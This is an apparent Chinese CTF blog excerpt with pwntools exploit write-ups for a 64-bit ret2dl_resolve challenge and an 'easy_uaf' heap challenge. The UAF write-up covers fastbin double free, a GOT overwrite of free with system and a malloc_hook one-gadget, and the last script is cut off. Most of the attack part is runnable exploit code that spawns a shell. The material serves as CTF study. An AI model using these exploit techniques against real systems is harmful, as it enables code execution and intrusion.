class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *context.log_level=<span class="hljs-string">'debug'</span>context.terminal=<span class="hljs-string">'/bin/zsh'</span>libc = ELF(<span class="hljs-string">"./libc-2.23.so"</span>)elf = ELF(<span class="hljs-string">"./ret2-dl"</span>)bss = elf.bss()log.info(<span class="hljs-string">".bss :0x%X"</span>%bss)write_addr = bss+<span class="hljs-number">0xac0</span>    <span class="hljs-comment"># 这里要调试一下，rsp有可能落在非bss上</span>rbp = write_addr<span class="hljs-number">-0x8</span>fake_link_map_addr = write_addr+<span class="hljs-number">0x18</span>vuln_addr = <span class="hljs-number">0x0000000000400687</span>pop7ret = <span class="hljs-number">0x000000000040073a</span>mov3call = <span class="hljs-number">0x0000000000400720</span>plt_load = <span class="hljs-number">0x4004e6</span> <span class="hljs-comment"># jmp</span>read_got = elf.got[<span class="hljs-string">'read'</span>]<span class="hljs-comment"># ELF64_sym_size = 0x18</span><span class="hljs-comment"># ELF64_Rela_size = 0x18</span><span class="hljs-string">'''</span><span class="hljs-string">typedef struct            </span><span class="hljs-string">&#123;</span><span class="hljs-string">    Elf64_Word    st_name;        /* Symbol name (string tbl index) */</span><span class="hljs-string">      unsigned char    st_info;    /* Symbol type and binding */        </span><span class="hljs-string">      unsigned char st_other;        /* Symbol visibility */              </span><span class="hljs-string">      Elf64_Section    st_shndx;    /* Section index */                  </span><span class="hljs-string">      Elf64_Addr    st_value;        /* Symbol value */                   </span><span class="hljs-string">      Elf64_Xword    st_size;        /* Symbol size */                    </span><span class="hljs-string">&#125;Elf64_Sym;</span><span class="hljs-string"> </span><span class="hljs-string">typedef struct           </span><span class="hljs-string">&#123;</span><span class="hljs-string">  Elf64_Addr    r_offset;        /* Address */                         </span><span class="hljs-string">  Elf64_Xword    r_info;            /* Relocation type and symbol index */</span><span class="hljs-string">  Elf64_Sxword    r_addend;        /* Addend */                          </span><span class="hljs-string">&#125;Elf64_Rela;</span><span class="hljs-string"> </span><span class="hljs-string">typedef struct          </span><span class="hljs-string">&#123;</span><span class="hljs-string">  Elf64_Sxword    d_tag;            /* Dynamic entry type */</span><span class="hljs-string">  union</span><span class="hljs-string">    &#123;</span><span class="hljs-string">      Elf64_Xword d_val;        /* Integer value */</span><span class="hljs-string">      Elf64_Addr d_ptr;            /* Address value */</span><span class="hljs-string">    &#125; d_un;</span><span class="hljs-string">&#125;Elf64_Dyn;</span><span class="hljs-string">'''</span><span class="hljs-comment">#fake_Elf64_Dyn_STR_addr = link_map +0x68  </span><span class="hljs-comment">#fake_Elf64_Dyn_SYM_addr = link_map +0x70  </span><span class="hljs-comment">#fake_Elf64_Dyn_JMPREL_addr = link_map +0xf8</span><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get_fake_link_map</span><span class="hljs-params">(fake_link_map_addr,l_addr,st_value)</span>:</span>  <span class="hljs-comment"># 给出各个指针的假地址</span>  fake_Elf64_Dyn_STR_addr = p64(fake_link_map_addr)  fake_Elf64_Dyn_SYM_addr = p64(fake_link_map_addr + <span class="hljs-number">0x8</span>)  fake_Elf64_Dyn_JMPREL_addr = p64(fake_link_map_addr + <span class="hljs-number">0x18</span>)  <span class="hljs-comment"># 伪造相关结构体</span>  fake_Elf64_Dyn_SYM = flat(p64(<span class="hljs-number">0</span>),p64(st_value<span class="hljs-number">-8</span>))  fake_Elf64_Dyn_JMPREL = flat(p64(<span class="hljs-number">0</span>),p64(fake_link_map_addr+<span class="hljs-number">0x28</span>)  )<span class="hljs-comment"># JMPREL指向.rel.plt地址，放在fake_link_map_addr+0x28</span>  r_offset = fake_link_map_addr - l_addr  log.info(<span class="hljs-string">"r_offset :"</span>+str(hex(r_offset)))  fake_Elf64_rela = flat(p64(r_offset),p64(<span class="hljs-number">7</span>),p64(<span class="hljs-number">0</span>))  <span class="hljs-comment"># fake_link_map整体结构</span>  fake_link_map = flat(   <span class="hljs-comment"># 0x0</span>    p64(l_addr),          <span class="hljs-comment"># 0x8</span>    fake_Elf64_Dyn_SYM,   <span class="hljs-comment"># 0x18</span>    fake_Elf64_Dyn_JMPREL,<span class="hljs-comment"># 0x28</span>    fake_Elf64_rela,      <span class="hljs-comment"># 0x40</span>    <span class="hljs-string">"\x00"</span>*<span class="hljs-number">0x28</span>,         <span class="hljs-comment"># 0x68，下面开始放指针</span>    fake_Elf64_Dyn_STR_addr,  <span class="hljs-comment"># STRTAB指针,0x70</span>    fake_Elf64_Dyn_SYM_addr,  <span class="hljs-comment"># SYMTAB指针,0x78</span>    <span class="hljs-string">"/bin/sh\x00"</span>.ljust(<span class="hljs-number">0x80</span>,<span class="hljs-string">"\x00"</span>),    fake_Elf64_Dyn_JMPREL_addr, <span class="hljs-comment"># JMPREL指针</span>  )  <span class="hljs-keyword">return</span> fake_link_map  l_addr = libc.sym[<span class="hljs-string">'system'</span>] - libc.sym[<span class="hljs-string">'__libc_start_main'</span>] <span class="hljs-comment"># l-&gt;l_addr设置为 system 与 __libc_start_main 的偏移值,此时__libc_start_main是一个已经解析过的函数</span>log.info(<span class="hljs-string">"l_addr :"</span>+str(hex(l_addr)))log.info(<span class="hljs-string">"elf.got['__libc_start_main'] :"</span>+str(hex(elf.got[<span class="hljs-string">'__libc_start_main'</span>])))log.info(<span class="hljs-string">"plt_load :"</span>+str(hex(<span class="hljs-number">0x4004e6</span>)))log.info(<span class="hljs-string">"write_addr :"</span>+str(hex(write_addr)))<span class="hljs-comment">#l-&gt;l_addr + sym-&gt;st_value</span><span class="hljs-comment"># value = DL_FIXUP_MAKE_VALUE (l, l-&gt;l_addr + sym-&gt;st_value);</span>st_value = elf.got[<span class="hljs-string">'__libc_start_main'</span>]fake_link_map = get_fake_link_map(fake_link_map_addr,l_addr,st_value)io = process(<span class="hljs-string">"./ret2-dl"</span>)<span class="hljs-comment"># 1. 首先，利用栈迁移，把fake_link_map放在bss段上</span>rop = flat( <span class="hljs-string">'a'</span>*<span class="hljs-number">0x70</span>,  <span class="hljs-comment"># 此时到达老rbp</span>            p64(rbp),            p64(pop7ret),            p64(<span class="hljs-number">0</span>),            p64(<span class="hljs-number">1</span>),            p64(read_got),  <span class="hljs-comment"># 重新调用read函数  r12</span>            p64(len(fake_link_map)+<span class="hljs-number">0x18</span>+<span class="hljs-number">0x10</span>),   <span class="hljs-comment"># read读入长度 </span>            p64(write_addr),                  <span class="hljs-comment"># read读入位置  </span>            p64(<span class="hljs-number">0</span>),                               <span class="hljs-comment"># </span>            p64(mov3call),            p64(<span class="hljs-number">0</span>)*<span class="hljs-number">7</span> ,                        <span class="hljs-comment"># 补位</span>            p64(vuln_addr)                       <span class="hljs-comment"># 再返回vuln函数</span>)log.info(hex(len(fake_link_map)+<span class="hljs-number">0x18</span>+<span class="hljs-number">0x10</span>))io.sendline(rop)        <span class="hljs-comment"># 此rop中包含了ret2csu，利用其向bss上读数据</span>sleep(<span class="hljs-number">1</span>)<span class="hljs-comment"># 2. 接下来，由于我们在rop中利用ret2csu调用了read函数，我们开始向bss上读数据，以下数据内容是由rop中ret2csu调用的read函数读取的。</span>fake = flat(            p64(plt_load),            p64(fake_link_map_addr),            p64(<span class="hljs-number">0</span>),            fake_link_map      <span class="hljs-comment"># fake_link_map本体</span>)log.info(hex(len(fake)))io.sendline(fake)attach(io)pause()pop_rdi_ret = <span class="hljs-number">0x0000000000400743</span>leave = <span class="hljs-number">0x4006a6</span>stack_mig = flat(            <span class="hljs-string">'a'</span>*<span class="hljs-number">0x70</span>,            p64(rbp),            p64(pop_rdi_ret),            p64(fake_link_map_addr+<span class="hljs-number">0x78</span>), <span class="hljs-comment"># /bin/sh</span>            p64(leave))sleep(<span class="hljs-number">1</span>)io.sendline(stack_mig)io.interactive()</code></pre><h2 id="后续奇怪的调试以及64位32位的一个差别"><a href="#后续奇怪的调试以及64位32位的一个差别" class="headerlink" title="后续奇怪的调试以及64位32位的一个差别"></a>后续奇怪的调试以及64位32位的一个差别</h2></li><li>在编写exp的时候，遇到了一些诡异的问题，比如一开始想把他放在bss+0x500，结果。。<img src="https://s1.ax1x.com/2020/06/13/tvPj1g.jpg" srcset="/img/loading.gif" alt="">)出现了诡异的非法内存访问。。在64位下调用的是<code>_dl_runtime_resolve_xsavec</code>,这个函数起始是有写地址操作的。但是按理说我应该把他已经放上bss了而bss是可读可写的，看一下这个时候的rsp，确实落在一个不可写的区间，并且这个区间是相对bss有偏移的。<img src="https://s1.ax1x.com/2020/06/13/tviI8U.jpg" srcset="/img/loading.gif" alt=""></li><li>leave之后确实栈被拉到了bss+0x500<img src="https://s1.ax1x.com/2020/06/13/tvF5dI.png" srcset="/img/loading.gif" alt=""></li><li>一直到进入<code>_dl_runtime_resolve_xsavec</code>都是没问题的。看来问题就是出在下面那两条指令上了。<img src="https://s1.ax1x.com/2020/06/13/tvk16e.png" srcset="/img/loading.gif" alt=""></li><li>找到罪魁祸首了,偏移就是这条sub指令造成的<img src="https://s1.ax1x.com/2020/06/13/tvkvcD.png" srcset="/img/loading.gif" alt=""></li><li>在32位下，ret2dl调用的是：<code>_dl_runtime_resolve</code>，如图<img src="https://s1.ax1x.com/2020/06/13/tvAyvD.png" srcset="/img/loading.gif" alt=""></li><li><strong>而64位下，ret2dl调用</strong><code>_dl_runtime_resolve_xsavec</code>，如图：<img src="https://s1.ax1x.com/2020/06/13/tvAWVA.png" srcset="/img/loading.gif" alt=""><strong>明显对rsp有一个sub操作，偏移就是他造成的。这次也算是踩坑了，以后也记住了要考虑一下这个玩意。。</strong></li></ul><h2 id="主要参考文章"><a href="#主要参考文章" class="headerlink" title="主要参考文章"></a>主要参考文章</h2><p><a href="https://forum.90sec.com/t/topic/260" target="_blank" rel="noopener">1</a><br><a href="https://bbs.pediy.com/thread-253833.htm" target="_blank" rel="noopener">2</a></p>]]></content>
    
    
    <categories>
      
      <category>TaL第一次周赛</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ret2dl_resolve</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>TaLpwn UAF</title>
    <link href="/2020/06/08/TaLpwn_UAF/"/>
    <url>/2020/06/08/TaLpwn_UAF/</url>
    
    <content type="html"><![CDATA[<p><del>这次周赛真的学到许多，其中64位ret2dl还应当再研究一下（没做出来），这道经典的堆题整理一下思路</del></p><h1 id="0x0-考察内容"><a href="#0x0-考察内容" class="headerlink" title="0x0 考察内容"></a>0x0 考察内容</h1><ul><li>fastbin attack</li><li>UAF</li><li>double free</li><li>got 表劫持</li><li>unsortedbin切割</li><li>realloc调整栈空间构造ogg条件<h1 id="0x1-题目概览"><a href="#0x1-题目概览" class="headerlink" title="0x1 题目概览"></a>0x1 题目概览</h1></li><li>经典64位菜单堆没去符号表没开PIE，出题大师傅：“不开PIE的堆就是裸题”，之前还没体会到这句话，这道题确实体会了一下qwq</li><li>先看看关键的add函数。总结：size可控、buf可控。<img src="https://s1.ax1x.com/2020/06/08/thdoon.png" alt=""></li><li>del函数free后不置空，存在UAF，free的同时将chunk表中存储相应笔记的那一行记录的size置0<img src="https://s1.ax1x.com/2020/06/08/thdXyF.png" alt=""></li><li>edit函数在编辑之前检查了三个东西：1.idx的合法性。2.chunks表中存储的相应的buf指针是否为空。3.chunks表中存储的相应的buf的size是否为0。所以我们无法编辑已经被del后的buf<img src="https://s1.ax1x.com/2020/06/08/th0uB4.png" alt=""></li><li>show函数，只检查idx合法性以及chunks中对应的buf的指针是否存在（其实是恒存在的，del的时候只将buf的size设置为0，没有清空buf的指针）<img src="https://s1.ax1x.com/2020/06/08/th0o80.png" alt=""></li><li>全局变量chunks的结构，存储的是每一条buf的地址以及size。<img src="https://s1.ax1x.com/2020/06/08/thDhpq.png" alt=""></li></ul><h1 id="攻击思路一"><a href="#攻击思路一" class="headerlink" title="攻击思路一"></a>攻击思路一</h1><ul><li>第一个思路是通过在fastbin中double free然后修改全局的chunks表中某一未free的buf的地址(如果有不清楚fastbin中doublefree的请看<a href="https://zhuanlan.zhihu.com/p/64434547" target="_blank" rel="noopener">fastbin中的doublefree</a>)，让这个地址指向got表中free函数对应的地址，然后edit编辑这个buf，等价于修改了got表中free函数的地址，我们将free函数的地址改为system函数的地址，然后将shellcode写在某一未free的buf的chunk上，然后free这个buf，此时相当于调用了system(“bin/sh/“)<img src="https://s1.ax1x.com/2020/06/08/thWO4U.png" alt=""></li></ul><h2 id="0x1-整体过程"><a href="#0x1-整体过程" class="headerlink" title="0x1 整体过程"></a>0x1 整体过程</h2><ul><li>首先add三个块，大小分别是0x30、0x20、0x20、申请完chunks是这么个情况<img src="https://s1.ax1x.com/2020/06/08/th5ev4.png" alt=""></li><li>然后对idx为1和2 的块double free。就是那两个大小是0x20和0x20的。<img src="https://s1.ax1x.com/2020/06/09/thTsG6.png" alt=""></li><li>doublefree结束后，add一次，此时对fastbin中第一个chunk进行了一次写入，我们将fd的位置替换为fake chunk位置，此时我们将fd指向chunks的起始地址，也就是0x6020c0，这里刚好是我们申请的0x30那个块在chunks中存储信息的相应位置，为什么指向这里呢，<strong>因为这里的0x30恰好满足fastbin的size检查！这也是我们一开始错位构造的一个原因；并且，我们将0x30的记录放在chunks的最上面也意味着我们可以对他下面的所有的其他记录进行修改，这个修改的空间是比较大的，这是第二个原因。</strong></li><li>然后我们add一次写上fake_fd指针指向chunks、再add两次。<img src="https://s1.ax1x.com/2020/06/09/thHjCq.png" alt="">可以看到此时，fastbin的第一项已经成功指向了chunks。</li><li>接下来我们通过这个来做任意地址写，替换掉free在got中的真实地址。我们add，同时发送payload为free函数对应got表项的地址。<img src="https://s1.ax1x.com/2020/06/09/thburD.png" alt=""></li><li>在edit一次，编辑这个假记录，等价于编辑free@got中free的真实地址，我们改为system。（当然要泄漏一下真实地址算一下libc base）<img src="https://s1.ax1x.com/2020/06/09/thbsGq.png" alt=""></li><li>最后把shellcode写在堆上，然后free掉这个块，等价于调用了system(“/bin/sh”)</li></ul><h2 id="0x2-Exp"><a href="#0x2-Exp" class="headerlink" title="0x2 Exp"></a>0x2 Exp</h2><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># encoding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line">context.terminal=<span class="string">'/bin/zsh'</span></span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">"./libc-2.23.so"</span>)</span><br><span class="line">elf = ELF(<span class="string">"./easy_uaf"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(io,size,buf)</span>:</span></span><br><span class="line">    io.recvuntil(<span class="string">"&gt;&gt; "</span>)</span><br><span class="line">    io.sendline(<span class="string">"1"</span>)</span><br><span class="line">    io.recvuntil(<span class="string">"size: "</span>)    </span><br><span class="line">    io.sendline(str(size))</span><br><span class="line">    io.recvuntil(<span class="string">"buf: "</span>)</span><br><span class="line">    io.sendline(str(buf))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delt</span><span class="params">(io,idx)</span>:</span></span><br><span class="line">    io.recvuntil(<span class="string">"&gt;&gt; "</span>)</span><br><span class="line">    io.sendline(<span class="string">"4"</span>)</span><br><span class="line">    io.recvuntil(<span class="string">"idx: "</span>)</span><br><span class="line">    io.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(io,idx)</span>:</span></span><br><span class="line">    io.recvuntil(<span class="string">"&gt;&gt; "</span>)</span><br><span class="line">    io.sendline(<span class="string">"3"</span>)</span><br><span class="line">    io.recvuntil(<span class="string">"idx: "</span>)</span><br><span class="line">    io.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(io,idx,buf)</span>:</span></span><br><span class="line">    io.recvuntil(<span class="string">"&gt;&gt; "</span>)</span><br><span class="line">    io.sendline(<span class="string">"2"</span>)</span><br><span class="line">    io.recvuntil(<span class="string">"idx: "</span>)</span><br><span class="line">    io.sendline(str(idx))</span><br><span class="line">    io.recvuntil(<span class="string">"buf: "</span>)</span><br><span class="line">    io.sendline(str(buf))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io = process(<span class="string">"./easy_uaf"</span>)</span><br><span class="line"></span><br><span class="line">chunk = <span class="number">0x6020c0</span>    <span class="comment"># 储存每个块的指针+大小</span></span><br><span class="line">free_got = elf.got[<span class="string">'free'</span>]</span><br><span class="line"></span><br><span class="line">chunk_32 = <span class="number">0x6020e0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">size = <span class="number">0x20</span></span><br><span class="line">add(io,<span class="number">0x30</span>,<span class="string">"b"</span>*<span class="number">0x10</span>)   <span class="comment">#id:0</span></span><br><span class="line">add(io,size,<span class="string">"a"</span>*<span class="number">0x10</span>)   <span class="comment">#id:1</span></span><br><span class="line">add(io,size,<span class="string">"b"</span>*<span class="number">0x10</span>)   <span class="comment">#id:2</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">delt(io,<span class="number">1</span>)</span><br><span class="line">delt(io,<span class="number">2</span>)</span><br><span class="line">delt(io,<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p1 = flat(p64(chunk))       </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(io,size,p1)     <span class="comment"># 做假fd</span></span><br><span class="line"></span><br><span class="line">add(io,size,<span class="string">"c"</span>*<span class="number">0x10</span>)</span><br><span class="line">add(io,size,<span class="string">"d"</span>*<span class="number">0x10</span>)</span><br><span class="line"><span class="comment"># 此时fatbin指向假fd的位置</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p3 = flat(p64(free_got),p64(<span class="number">8</span>))</span><br><span class="line"><span class="keyword">print</span> <span class="string">"free_got :"</span>,hex(free_got)</span><br><span class="line"></span><br><span class="line">add(io,size,p3) <span class="comment"># 改掉chunk的索引为free got</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">show(io,<span class="number">1</span>)      <span class="comment"># 利用freegot泄漏free的真实地址计算libc base</span></span><br><span class="line">free_now = u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line"><span class="keyword">print</span> <span class="string">"free_now:"</span>,hex(free_now)</span><br><span class="line">offset = free_now-libc.sym[<span class="string">'free'</span>]</span><br><span class="line"><span class="keyword">print</span> <span class="string">"offset:"</span>,hex(offset)</span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line"><span class="comment"># attach(io)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">"system :"</span>,hex(libc.sym[<span class="string">'system'</span>]+offset)</span><br><span class="line">sys = libc.sym[<span class="string">'system'</span>]+offset</span><br><span class="line"></span><br><span class="line">p4 = flat(p64(sys))</span><br><span class="line">edit(io,<span class="number">1</span>,p4)           <span class="comment"># 改free为system</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p5 = flat(<span class="string">"/bin/sh"</span>.ljust(<span class="number">0x20</span>,<span class="string">"\x00"</span>))</span><br><span class="line">edit(io,<span class="number">3</span>,p5)           <span class="comment"># shellcode  写入</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">delt(io,<span class="number">3</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h1 id="攻击思路二"><a href="#攻击思路二" class="headerlink" title="攻击思路二"></a>攻击思路二</h1><p><a href="https://blog.csdn.net/Breeze_CAT/article/details/103789081" target="_blank" rel="noopener">一道类似思路的题</a></p><h2 id="0x1-整体过程-1"><a href="#0x1-整体过程-1" class="headerlink" title="0x1 整体过程"></a>0x1 整体过程</h2><ul><li>通过申请一个0x80的放入unsortbin和一个0x10的放入fastbin；然后再申请0x60，此时造成unsortedbin中的chunk被切割，返回的还是之前的chunk，UAF了（只不过此时的size变成0x60）</li><li>然后show（）拿到main_arena地址进而获取malloc hook的地址，继而获取libc_base。</li><li>再删掉这个0x60的块（del时不检查这个块是否被删过了），把它放到fastbin</li><li>此时再直接编辑这个在fastbin中的块，直接改他的fd指针到malloc_hook-0x23。</li><li>然后再把它申请回来，此时fastbin指向fakechunk（malloc_hook-0x23）</li><li>然后调用add写这个fakechunk，改realloc hook为ogg，同时改malloc hook为realloc+偏移来调整栈空间确保满足ogg的条件<img src="https://s1.ax1x.com/2020/06/09/t4bC0e.jpg" alt="">当栈空间调整结束后[rsp+30]==0 成立<img src="https://s1.ax1x.com/2020/06/09/t4HOYR.png" alt=""></li><li>最后一次add，pwn。<h2 id="0x2-EXP"><a href="#0x2-EXP" class="headerlink" title="0x2 EXP"></a>0x2 EXP</h2><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># encoding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#context.log_level='debug'</span></span><br><span class="line">context.terminal=<span class="string">'/bin/zsh'</span></span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">"./libc-2.23.so"</span>)</span><br><span class="line">elf = ELF(<span class="string">"./easy_uaf"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(io,size,buf)</span>:</span></span><br><span class="line">    io.recvuntil(<span class="string">"&gt;&gt; "</span>)</span><br><span class="line">    io.sendline(<span class="string">"1"</span>)</span><br><span class="line">    io.recvuntil(<span class="string">"size: "</span>)    </span><br><span class="line">    io.sendline(str(size))</span><br><span class="line">    io.recvuntil(<span class="string">"buf: "</span>)</span><br><span class="line">    io.sendline(str(buf))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delt</span><span class="params">(io,idx)</span>:</span></span><br><span class="line">    io.recvuntil(<span class="string">"&gt;&gt; "</span>)</span><br><span class="line">    io.sendline(<span class="string">"4"</span>)</span><br><span class="line">    io.recvuntil(<span class="string">"idx: "</span>)</span><br><span class="line">    io.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(io,idx)</span>:</span></span><br><span class="line">    io.recvuntil(<span class="string">"&gt;&gt; "</span>)</span><br><span class="line">    io.sendline(<span class="string">"3"</span>)</span><br><span class="line">    io.recvuntil(<span class="string">"idx: "</span>)</span><br><span class="line">    io.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(io,idx,buf)</span>:</span></span><br><span class="line">    io.recvuntil(<span class="string">"&gt;&gt; "</span>)</span><br><span class="line">    io.sendline(<span class="string">"2"</span>)</span><br><span class="line">    io.recvuntil(<span class="string">"idx: "</span>)</span><br><span class="line">    io.sendline(str(idx))</span><br><span class="line">    io.recvuntil(<span class="string">"buf: "</span>)</span><br><span class="line">    io.sendline(str(buf))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span><span class="params">(io)</span>:</span></span><br><span class="line">    attach(io)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">"./easy_uaf"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#========================================</span></span><br><span class="line"></span><br><span class="line">chunk = <span class="number">0x6020c0</span>    <span class="comment"># 储存每个块的指针+大小</span></span><br><span class="line">free_got = elf.got[<span class="string">'free'</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(io,<span class="number">0x80</span>,<span class="string">'a'</span>*<span class="number">0x10</span>)   <span class="comment">#先开0x80</span></span><br><span class="line">add(io,<span class="number">0x10</span>,<span class="string">'b'</span>*<span class="number">0x09</span>)   <span class="comment">#再开0x10</span></span><br><span class="line"></span><br><span class="line">delt(io,<span class="number">0</span>)              <span class="comment"># 删掉0x80</span></span><br><span class="line"></span><br><span class="line">add(io,<span class="number">0x60</span>,<span class="string">'c'</span>*<span class="number">7</span>)      <span class="comment"># 再开0x60此时返回的是之前删掉的0x80的块，UAF（切割）</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">show(io,<span class="number">0</span>)     <span class="comment"># show不检查size，所以打出来main_arena+88</span></span><br><span class="line">io.recv(<span class="number">8</span>)      <span class="comment"># 过滤8个字节</span></span><br><span class="line">main_arena_88 = u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line"><span class="keyword">print</span> <span class="string">"main_arena_88: "</span>,hex(int(main_arena_88)<span class="number">-0x80</span>)</span><br><span class="line">malloc_hook = main_arena_88 - <span class="number">0x80</span> - <span class="number">88</span> - <span class="number">0x10</span></span><br><span class="line"><span class="keyword">print</span> <span 